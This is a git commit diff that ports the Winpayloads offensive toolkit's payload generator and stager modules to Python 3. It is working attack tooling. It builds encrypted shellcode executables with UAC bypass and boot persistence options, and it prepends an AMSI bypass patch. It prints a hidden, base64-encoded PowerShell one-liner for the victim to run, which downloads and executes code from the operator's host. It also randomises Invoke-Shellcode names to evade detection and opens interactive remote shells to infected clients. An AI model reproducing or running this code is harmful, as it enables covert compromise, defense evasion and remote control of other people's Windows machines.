d2c0d2dde91d90860ded4701c3166e67a62a0851
kali-elidas <python.elidas@gmail.com>
2024-12-06 14:59:16 +0100

    Updated and working, not completly checked

--- lib/generatepayload.py
+++ lib/generatepayload.py
@@ -1,12 +1,17 @@
-from main import *
-from payloadextras import *
-from psexecspray import *
-from startmetasploit import *
-from generatepayload import *
-from menu import *
-from encrypt import *
-from stager import *
+from .startmetasploit import METASPLOIT
+from .main import Spinner, payloaddir, injectwindows, DoServe
+from .payloadextras import EXTRAS
+from .encrypt import do_Encryption
+import os
+import blessed
+import sys
+import time
+import string
+import random
+import subprocess
+import PyInstaller.__main__
 
+t = blessed.Terminal()
 
 METASPLOIT_Functions = {
     'reverse': {
@@ -37,49 +42,57 @@ METASPLOIT_Functions = {
         'nclisten': METASPLOIT().nclisterner,
     }
 }
+
+
 def askAndReturnModules(shellcode, metasploit_type):
     if metasploit_type == 'nclistener':
         return (EXTRAS(shellcode).RETURN_EZ2READ_SHELLCODE(), METASPLOIT_Functions[metasploit_type]['nclisten'])
     else:
-        want_UACBYPASS = raw_input(t.bold_red + '[*] Try UAC Bypass(Only Works For Local Admin Account)?' + t.bold_red + ' y/[n]:' + t.normal)
+        want_UACBYPASS = input(t.bold_red + '[*] Try UAC Bypass(Only Works For Local Admin Account)?' + t.bold_red + ' y/[n]:' + t.normal)
         if want_UACBYPASS.lower() == 'y':
-            win7orwin10 = raw_input(t.bold_red + '[*] Windows 7 or 10?' + t.bold_red + ' 7/[10]:' + t.normal)
+            win7orwin10 = input(t.bold_red + '[*] Windows 7 or 10?' + t.bold_red + ' 7/[10]:' + t.normal)
             if not win7orwin10:
                 win7orwin10 = "10"
             return (EXTRAS(shellcode).UACBYPASS(win7orwin10), METASPLOIT_Functions[metasploit_type]['uacbypass'])
 
-        want_ALLCHECKS = raw_input(t.bold_red + '[*] Invoke Priv Esc Checks? y/[n]:' + t.normal)
+        want_ALLCHECKS = input(t.bold_red + '[*] Invoke Priv Esc Checks? y/[n]:' + t.normal)
         if want_ALLCHECKS.lower() == 'y':
             return (EXTRAS(shellcode).ALLCHECKS(), METASPLOIT_Functions[metasploit_type]['allchecks'])
 
-        want_PERSISTENCE = raw_input(t.bold_red + '[*] Persistent Payload on Boot? y/[n]:' + t.normal)
+        want_PERSISTENCE = input(t.bold_red + '[*] Persistent Payload on Boot? y/[n]:' + t.normal)
         if want_PERSISTENCE.lower() == 'y':
             return (EXTRAS(shellcode).PERSISTENCE(), METASPLOIT_Functions[metasploit_type]['persistence'])
 
         return (EXTRAS(shellcode).RETURN_EZ2READ_SHELLCODE(), METASPLOIT_Functions[metasploit_type]['normal'])
 
-def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
-    from menu import clientMenuOptions
-    if len(clientMenuOptions.keys()) > 2:
-        from stager import clientUpload
+
+def GeneratePayload(ez2read_shellcode, payloadname, shellcode):
+    from .menu import clientMenuOptions
+    if len(list(clientMenuOptions.keys())) > 2:
+        from .stager import clientUpload
         if clientUpload(powershellExec=ez2read_shellcode, isExe=True, json='{"type":"", "data":"%s", "sendoutput":"false", "multiple":"true"}'):
             return True
 
-    randoFileName = ''.join(random.sample(string.ascii_lowercase, 8))
-    with open('%s/%s.py' % (payloaddir(), randoFileName), 'w+') as Filesave:
-        Filesave.write(do_Encryption(SHELLCODE.injectwindows % (ez2read_shellcode)))
+    randoFileName = ''.join(random.sample(string.ascii_lowercase, 8)) + '.py'
+    with open('%s/%s' % (payloaddir('cwd'), randoFileName), 'w+') as Filesave:
+        Filesave.write(do_Encryption(injectwindows % (ez2read_shellcode)))
         Filesave.close()
-    print '[*] Creating Payload using Pyinstaller...'
-
-    p = subprocess.Popen(['wine', os.path.expanduser('~') + '/.win32/drive_c/Python27/python.exe', '/opt/pyinstaller/pyinstaller.py',
+    print('[*] Creating Payload using Pyinstaller...')
+    # New version
+    PyInstaller.__main__.run(['/'.join([payloaddir('cwd'), randoFileName]), '--nowindowed', '--onefile'])
+    '''Old Version
+    pyinstallerLocation = os.path.dirname(__file__).replace('/lib', '/winpayloads/lib/python3.12/site-packages/PyInstaller/__main__.py')
+    p = subprocess.Popen(['wine', os.path.expanduser('~') + '/.win32/drive_c/Python37/python.exe', pyinstallerLocation,
                           '%s/%s.py' % (payloaddir(), randoFileName), '--noconsole', '--onefile'], env=dict(os.environ, **{'WINEARCH':'win32','WINEPREFIX':os.path.expanduser('~') + '/.win32'}), bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+		'''
     LOADING = Spinner('Generating Payload')
-    while p.poll() == None:
+    '''
+    while p.poll() is None:
         LOADING.Update()
         time.sleep(0.2)
-    print '\r',
+    print('\r', end=' ')
     sys.stdout.flush()
-
+    
     payloadstderr = p.stderr.read()
     if len(sys.argv) > 1:
         if sys.argv[1] == "-debug":
@@ -87,27 +100,30 @@ def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
     try:
         os.rename('dist/%s.exe' % randoFileName, '%s/%s.exe' % (payloaddir(), randoFileName))
     except OSError:
-        print t.bold_red + "[!] Error while creating payload..." + t.normal
-        print payloadstderr
+        print(t.bold_red + "[!] Error while creating payload..." + t.normal)
+        print(payloadstderr)
         return False
+     '''
 
-    print t.normal + '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s.exe' % (payloaddir(), randoFileName) + t.normal
+    print(t.normal + '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s.exe' % (payloaddir(), randoFileName) + t.normal)
     CleanUpPayloadMess(randoFileName)
     DoPayloadUpload(randoFileName)
     return True
 
 
 def CleanUpPayloadMess(randoFileName):
+    print(payloaddir())
     os.system('rm dist -r')
     os.system('rm build -r')
     os.system('rm *.spec')
-    os.system('rm %s/%s.py' % (payloaddir(), randoFileName))
+    #os.system('rm %s/%s.py' % (payloaddir(), randoFileName))
+
 
 def DoPayloadUpload(payloadname):
-    from menu import returnIP
-    want_to_upload = raw_input(
+    from .menu import returnIP
+    want_to_upload = input(
         '\n[*] Upload To Local Websever or (p)sexec? [y]/p/n: ')
-    if want_to_upload.lower() == 'p' or want_to_upload.lower() == 'psexec':
-        DoPsexecSpray(payloaddir() + '/' + payloadname + '.exe')
-    elif want_to_upload.lower() == 'y' or want_to_upload.lower() == '':
-        FUNCTIONS().DoServe(returnIP(), payloadname, payloaddir(), port=8000, printIt = True)
+    #if want_to_upload.lower() == 'p' or want_to_upload.lower() == 'psexec':
+        #DoPsexecSpray(payloaddir() + '/' + payloadname + '.exe')
+    if want_to_upload.lower() == 'y' or want_to_upload.lower() == '':
+        DoServe(returnIP(), payloadname, payloaddir(), port=8000, printIt=True)
--- lib/stager.py
+++ lib/stager.py
@@ -1,66 +1,67 @@
-from __future__ import unicode_literals
-from main import *
-from menu import *
-from prompt_toolkit.contrib.completers import WordCompleter
+import prompt_toolkit
+import blessed
+import time
+from prompt_toolkit.completion import WordCompleter
+from prompt_toolkit.patch_stdout import patch_stdout
+from base64 import b64encode
+from .listener import StartAsync
+from .main import amsiPatch, payloaddir, randomUnusedPort, DoServe, \
+                 powershellShellcodeLayout, randomisePS1
+
 
 history = prompt_toolkit.history.InMemoryHistory()
 
+t = blessed.Terminal()
+
 serverlist = []
 
+
 def killAllClients():
-    numberofclientskilled = 0
-    from menu import clientMenuOptions
+    from .menu import clientMenuOptions
     if len(clientMenuOptions) > 2:
-        suretoquit = raw_input('You have clients connected. Are you sure you want to exit? [y]/n: ')
+        suretoquit = input('You have clients connected. Are you sure you want to exit? [y]/n: ')
         if suretoquit.lower() == 'y' or suretoquit.lower() == '':
             for server in serverlist:
-                for clientnumber in server.handlers.keys():
-                    numberofclientskilled += 1
-                    server.handlers[clientnumber].handle_close()
+                server.server.close()
             return True
         else:
             return False
     else:
         return True
 
+
 def printListener(printit=True, returnit=False):
-    from listener import Server
-    from menu import returnIP
+    from .menu import returnIP
     powershellFileName = 'p.ps1'
 
     while True:
-        bindOrReverse = prompt_toolkit.prompt('[?] (b)ind/(r)everse: ', patch_stdout=True, completer=WordCompleter(['b', 'r'])).lower()
-        if bindOrReverse == 'b' or bindOrReverse == 'r':
+        with patch_stdout():
+            bindOrReverse = prompt_toolkit.prompt('[?] (b)ind/(r)everse: ', completer=WordCompleter(['b', 'r'])).lower()
+        if bindOrReverse == 'b':
+            print('Bind is currently not working in python3')
+        elif bindOrReverse == 'r':
             break
+    powershellContent = open('lib/powershell/stager.ps1', 'r').read()
     if bindOrReverse == 'r':
-        powershellContent = open('lib/powershell/stager.ps1', 'r').read()
         windows_powershell_stager = powershellContent % ('False', returnIP(), '5555')
-    if bindOrReverse == 'b':
-        powershellContent = open('lib/powershell/stager.ps1', 'r').read()
-        windows_powershell_stager = powershellContent % ('True', '', '5556')
-
-    with open((payloaddir()+ '/' + powershellFileName), 'w') as powershellStagerFile:
-        powershellStagerFile.write(windows_powershell_stager)
+    with open((payloaddir() + '/' + powershellFileName), 'w') as powershellStagerFile:
+        stager_content = amsiPatch + windows_powershell_stager
+        powershellStagerFile.write(stager_content)
         powershellStagerFile.close()
 
-    randoStagerDLPort = FUNCTIONS().randomUnusedPort()
+    randoStagerDLPort = randomUnusedPort()
 
-    FUNCTIONS().DoServe(returnIP(), powershellFileName, payloaddir(), port=randoStagerDLPort, printIt = False)
-    stagerexec = 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.Webclient).DownloadString('http://" + returnIP() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le').encode('base64').replace('\n','')
-
+    DoServe(returnIP(), powershellFileName, payloaddir(), port=randoStagerDLPort, printIt = False)
+    stagerexec = 'powershell -w hidden -noni -enc ' + b64encode(("IEX (New-Object Net.Webclient).DownloadString('http://" + returnIP() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le')).decode()
     if printit:
-        print t.bold_green + '[!] Run this on target machine...' + t.normal + '\n\n' + stagerexec + '\n'
-
-    if bindOrReverse == 'b':
-        if not '5556' in str(serverlist):
-            ipADDR = raw_input('[?] IP Address of target (after executing stager): ')
-            connectserver = Server(ipADDR, 5556, bindsocket=False)
-            serverlist.append(connectserver)
+        print(t.bold_green + '[!] Run this on target machine...' + t.normal + '\n\n' + stagerexec + '\n')
 
     if bindOrReverse == 'r':
-        if not '5555' in str(serverlist):
-            listenerserver = Server('0.0.0.0', 5555, bindsocket=True)
-            serverlist.append(listenerserver)
+        if not serverlist:
+            listener = StartAsync()
+            listener.start()
+            serverlist.append(listener)
+
     if returnit:
         return stagerexec
     else:
@@ -69,37 +70,39 @@ def printListener(printit=True, returnit=False):
 
 def interactShell(clientnumber):
     clientnumber = int(clientnumber)
-    from menu import clientMenuOptions
+    from .menu import clientMenuOptions
     for server in serverlist:
-        if clientnumber in server.handlers.keys():
-            print "Commands\n" + "-"*50 + "\nback - Background Shell\nexit - Close Connection\n" + "-"*50
+        if clientnumber in list(server.server.clients.keys()):
+            print("Commands\n" + "-"*50 + "\nback - Background Shell\nexit - Close Connection\n" + "-"*50)
             while True:
                 try:
-                    if server.handlers[clientnumber].in_buffer:
-                        print server.handlers[clientnumber].in_buffer.pop()
-                    command = prompt_toolkit.prompt("PS >", completer=WordCompleter(['back', 'exit']), style=prompt_toolkit.styles.style_from_dict({prompt_toolkit.token.Token: '#FFCC66'}), history=history)
+                    if server.server.clients[clientnumber].in_buffer:
+                        print(server.server.clients[clientnumber].in_buffer.pop())
+                    command = prompt_toolkit.prompt("PS >", completer=WordCompleter(['back', 'exit']), style=prompt_toolkit.styles.Style.from_dict({'': '#FFCC66'}), history=history)
                     if command.lower() == "back":
                         break
                     if command.lower() == "exit":
-                        server.handlers[clientnumber].handle_close()
+                        server.server.clients[clientnumber].close_client()
                         del clientMenuOptions[str(clientnumber)]
                         time.sleep(2)
                         break
                     if command == "":
-                        server.handlers[clientnumber].out_buffer.append('{"type":"", "data":"", "sendoutput":""}')
+                        server.server.clients[clientnumber].writer.write('{"type":"", "data":"", "sendoutput":""}'.encode())
                     else:
-                        json = '{"type":"exec", "data":"%s", "sendoutput":"true"}'% ((base64.b64encode(command.encode('utf_16_le'))))
-                        server.handlers[clientnumber].out_buffer.append(json)
-                        while not server.handlers[clientnumber].in_buffer:
+                        json = '{"type":"exec", "data":"%s", "sendoutput":"true"}' % (b64encode(command.encode('UTF_16_le'))).decode()
+                        server.server.clients[clientnumber].writer.write(json.encode())
+                        while not server.server.clients[clientnumber].in_buffer:
                             time.sleep(0.01)
-                        print server.handlers[clientnumber].in_buffer.pop()
+                        print(server.server.clients[clientnumber].in_buffer.pop())
                 except KeyboardInterrupt:
                     break
 
     return "clear"
 
+
 def returnServerList():
     return serverlist
+
 
 def checkPayloadLength(payload):
     maxlen = 10000
@@ -127,61 +130,65 @@ def checkPayloadLength(payload):
 
 
 def checkUpload():
-    from menu import clientMenuOptions
-    use_client_upload = prompt_toolkit.prompt('\n[?] Upload Using Client Connection? [y]/n: ', patch_stdout=True, completer=WordCompleter(['y', 'n']))
-    print
+    from .menu import clientMenuOptions
+    with patch_stdout():
+        use_client_upload = prompt_toolkit.prompt('\n[?] Upload Using Client Connection? [y]/n: ', patch_stdout=True, completer=WordCompleter(['y', 'n']))
+    print()
     if use_client_upload.lower() == 'y' or use_client_upload == '':
         clientList = []
-        for i in clientMenuOptions.keys():
+        for i in list(clientMenuOptions.keys()):
             if i == 'back' or i == 'r':
                 pass
             else:
                 clientList.append(i)
-                print t.bold_yellow + i + t.normal + ': ' + t.bold_green + clientMenuOptions[i]['payload']  + t.bold_yellow + ' | ' + t.bold_green + clientMenuOptions[i]['availablemodules'].keys()[0] + t.bold_yellow + ' | ' + t.bold_green + clientMenuOptions[i]['availablemodules'].keys()[1] + t.normal
-        print
+                print(t.bold_yellow + i + t.normal + ': ' + t.bold_green + clientMenuOptions[i]['payload']  + t.bold_yellow + ' | ' + t.bold_green + list(clientMenuOptions[i]['availablemodules'].keys())[0] + t.bold_yellow + ' | ' + t.bold_green + list(clientMenuOptions[i]['availablemodules'].keys())[1] + t.normal)
+        print()
         while True:
-            clientchoice = prompt_toolkit.prompt('Client > ', patch_stdout=True, style=prompt_toolkit.styles.style_from_dict({prompt_toolkit.token.Token: '#FFCC66'}), completer=WordCompleter(clientList))
+            with patch_stdout():
+                clientchoice = prompt_toolkit.prompt('Client > ', patch_stdout=True, style=prompt_toolkit.styles.style_from_dict({prompt_toolkit.token.Token: '#FFCC66'}), completer=WordCompleter(clientList))
             try:
                 return int(clientMenuOptions[clientchoice]['params'])
             except:
                 continue
     return False
 
+
 def clientUpload(powershellExec, isExe, json):
-    from menu import returnIP
-    from encrypt import getSandboxScripts
+    from .menu import returnIP
+    from .encrypt import getSandboxScripts
     clientnumber = checkUpload()
     if clientnumber:
         if isExe:
-            newpayloadlayout = FUNCTIONS().powershellShellcodeLayout(powershellExec)
-            moduleport = FUNCTIONS().randomUnusedPort()
-            FUNCTIONS().DoServe(returnIP(), "", "./externalmodules", port = moduleport, printIt = False)
+            newpayloadlayout = powershellShellcodeLayout(powershellExec)
+            moduleport = randomUnusedPort()
+            powershellChanges = randomisePS1('Invoke-Shellcode')
+            filename = powershellChanges.get('filename')
+            pForce = powershellChanges['params'].get('Force')
+            pCode = powershellChanges['params'].get('Shellcode')
+            DoServe(returnIP(), "", "./externalmodules/staged", port=moduleport, printIt=False)
             encPowershell = getSandboxScripts('powershell')
-            encPowershell += "IEX(New-Object Net.WebClient).DownloadString('http://%s:%s/Invoke-Shellcode.ps1');Start-Sleep 30;Invoke-Code -Force -Shellcode @(%s)"%(returnIP(), moduleport, newpayloadlayout.rstrip(','))
-            encPowershell = base64.b64encode(encPowershell.encode('UTF-16LE'))
-            fullExec = "$Arch = (Get-Process -Id $PID).StartInfo.EnvironmentVariables['PROCESSOR_ARCHITECTURE'];if($Arch -eq 'x86'){powershell -exec bypass -enc \"%s\"}elseif($Arch -eq 'amd64'){$powershell86 = $env:windir + '\SysWOW64\WindowsPowerShell\\v1.0\powershell.exe';& $powershell86 -exec bypass -enc \"%s\"}"%(encPowershell,encPowershell)
-            b64Exec = base64.b64encode(fullExec.encode('UTF-16LE'))
-            lenb64 = len(b64Exec)
+            encPowershell += "IEX(New-Object Net.WebClient).DownloadString('http://%s:%s/%s.ps1');Start-Sleep 30;%s -%s -%s @(%s)"%(returnIP(), moduleport, filename, filename, pForce, pCode, newpayloadlayout.rstrip(','))
+            encPowershell = b64encode(encPowershell.encode('UTF-16LE'))
+            fullExec = "$Arch = (Get-Process -Id $PID).StartInfo.EnvironmentVariables['PROCESSOR_ARCHITECTURE'];if($Arch -eq 'x86'){powershell -exec bypass -enc \"%s\"}elseif($Arch -eq 'amd64'){$powershell86 = $env:windir + '\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe';& $powershell86 -exec bypass -enc \"%s\"}"%(encPowershell,encPowershell)
+            b64Exec = b64encode(fullExec.encode('UTF-16LE'))
         else:
-            b64Exec = base64.b64encode(powershellExec.encode('UTF-16LE'))
-            lenb64 = len(b64Exec)
-
+            b64Exec = b64encode(powershellExec.encode('UTF-16LE'))
 
         splitPayoad = checkPayloadLength(b64Exec)
 
         if splitPayoad:
             for p in splitPayoad:
                 for server in serverlist:
-                    if clientnumber in server.handlers.keys():
+                    if clientnumber in list(server.handlers.keys()):
                         server.handlers[clientnumber].out_buffer.append(json % (p))
                         time.sleep(0.5)
             time.sleep(0.5)
             for server in serverlist:
-                if clientnumber in server.handlers.keys():
+                if clientnumber in list(server.handlers.keys()):
                     server.handlers[clientnumber].out_buffer.append('{"type":"", "data":"", "sendoutput":"false", "multiple":"exec"}')
         else:
             for server in serverlist:
-                if clientnumber in server.handlers.keys():
+                if clientnumber in list(server.handlers.keys()):
                     server.handlers[clientnumber].out_buffer.append(json % (b64Exec))
 
         return clientnumber
